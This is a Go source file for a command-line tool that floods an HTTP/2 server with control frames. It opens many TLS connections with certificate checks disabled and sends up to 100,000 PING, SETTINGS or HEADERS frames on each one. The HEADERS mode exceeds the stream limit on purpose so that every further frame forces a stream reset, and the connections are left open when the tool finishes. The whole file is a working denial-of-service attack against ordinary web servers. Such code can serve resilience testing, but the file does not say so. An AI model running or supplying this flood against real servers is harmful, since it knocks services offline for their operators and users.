package main

import (
	"bytes"
	"flag"
	"log"
	"crypto/tls"
	"sync/atomic"
	"time"
	"net"
	"os"
	"fmt"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type CtrlFrameType int

const (
	CtrlFrameTypeUnknown CtrlFrameType = iota
	CtrlFramePing
	CtrlFrameSettings
	CtrlFrameRst
)

const (
	transportDefaultStreamFlow = 4 << 20
	maxFrameSize               = 1 << 24 - 1
	maxHeaderListSize          = 10 << 20
	headerTableSize            = 4096
)

var (
	connections		int
	threads    		int
	address         	string
	host       		string
	ctrl_frame_type		string
	frame_count		int
	debug			int
)

var finished int64

func transition(s string) CtrlFrameType {
	switch s {
	case "ping_frame":
		return CtrlFramePing
	case "settings_frame":
		return CtrlFrameSettings
	case "rst_stream_frame":
		return CtrlFrameRst
	default:
		panic(fmt.Errorf("Unknown frame type: %s", s))
	}

	return CtrlFrameTypeUnknown
}

func init() {
	flag.StringVar(&address, "address", ":443", "server address")
	flag.StringVar(&host, "host", "localhost", "host/authority header")
	flag.IntVar(&threads, "threads", 1, "number of threads to start")
	flag.IntVar(&connections, "connections", 1, "number of connections to start")
	flag.StringVar(&ctrl_frame_type, "ctrl_frame_type", "ping_frame", "type of control frames to flood")
	flag.IntVar(&frame_count, "frame_count", 100000, "count of frames to flood")
	flag.IntVar(&debug, "debug", 0, "debug level")
	flag.Parse()
}

func main() {
	log.Printf("Starting %d connections in %d threads", connections, threads)
	var conn_per_thread int = connections / threads
	var rem int = connections % threads

	for i := 0; i < threads; i++ {
		inc := 0
		if rem > 0 {
			inc = 1
			rem--
		}
		go func(i int, inc int) {
			for j := 0; j < conn_per_thread + inc; j++ {
				ctrl_frame_flood(i, ctrl_frame_type)
				nfinished := atomic.AddInt64(&finished, 1)
				if (nfinished == int64(connections)) {
					log.Printf("All connections are finished, stopping program\n")
					os.Exit(0)
				}
			}
		}(i, inc)
	}

	done := make(chan struct{})
	<-done
}

func ctrl_frame_flood(cid int, ctrl_frame_type string) {
	var frame_type = transition(ctrl_frame_type)
	conf := &tls.Config {
		InsecureSkipVerify: true,
		NextProtos: []string{"h2"},
    	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout:  2 * time.Second},
					"tcp", address, conf)
	if err != nil {
		if (debug > 0) {
			log.Printf("Connection error. Filtered?: %s\n", err)
		}
		return
	}

	_, err = conn.Write([]byte(http2.ClientPreface))
	if err != nil {
		panic(err)
	}

	framer := http2.NewFramer(conn, conn)


	initialSettings := []http2.Setting{
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: transportDefaultStreamFlow},
		{ID: http2.SettingMaxFrameSize, Val: maxFrameSize},
		{ID: http2.SettingMaxHeaderListSize, Val: maxHeaderListSize},
		{ID: http2.SettingHeaderTableSize, Val: headerTableSize},
	}
	err = framer.WriteSettings(initialSettings...)
	if err != nil {
		panic(err)
	}

	go func() {
		// Read 3 init frames:
		// SETTINGS, SETTINGS_ACK and WINDOW_UPDATE
		// and others
		for {
			_, err := readPrintFrame(cid, framer)
			if err != nil {
				//log.Printf("[%d] Read: %s\n", cid, err)
				return
			}
		}
	}()

	var stream_id uint32 = 1
	blockBuffer := bytes.Buffer{}
	henc := hpack.NewEncoder(&blockBuffer)
	henc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
	henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
	henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	henc.WriteField(hpack.HeaderField{Name: ":authority", Value: "localhost"})

	for sentFrames := 0; sentFrames < frame_count; sentFrames++ {
		switch frame_type {
    		case CtrlFramePing:
    			err = framer.WritePing(false, [8]byte{1,2,3,4})
		case CtrlFrameSettings:
			err = framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val : uint32(sentFrames)})
		case CtrlFrameRst:
			// Send headers frames until max_concurrent_streams will be
			// exceeded, then each new headers frame causes RST stream
			err = framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:	stream_id,
				EndStream:	false,
				EndHeaders:	true,
				BlockFragment:	blockBuffer.Bytes(),
			})
			stream_id += 2
		}
		if err != nil {
			log.Printf("[%d] Error writing %s: %s\n", cid, ctrl_frame_type, err)
			return
		}
	}
	
	// Connection will be left intact after this function ends
}

func readPrintFrame(cid int, framer *http2.Framer) (http2.Frame, error) {
	frame, err := framer.ReadFrame()
	if err != nil {
		log.Printf("[%d] Error reading %+v. Reason: %s\n", cid, frame, err)
		return frame, err
	}

	if debug > 1 {
		log.Printf("[%d] Read frame %+v\n", cid, frame)
	}

	if frame.Header().Type == http2.FrameGoAway {
		log.Println(frame.(*http2.GoAwayFrame).ErrCode)
	}

	return frame, nil
}
